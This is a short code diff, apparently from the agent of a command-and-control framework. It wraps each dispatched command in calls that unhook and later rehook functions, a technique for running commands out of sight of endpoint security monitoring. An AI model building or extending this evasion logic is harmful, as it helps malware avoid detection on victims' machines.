@@ -59,7 +59,14 @@ VOID CommandDispatcher() {
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                         if ( Commands[FunctionCounter].ID == TaskCommand) {
+                            // unhook
+                            HookingManager(TRUE);
+
+                            // execute command
                             Commands[FunctionCounter].Function(&Parser);
+
+                            // rehook
+                            HookingManager(FALSE);
                             FoundCommand = TRUE;
                             break;
                         }
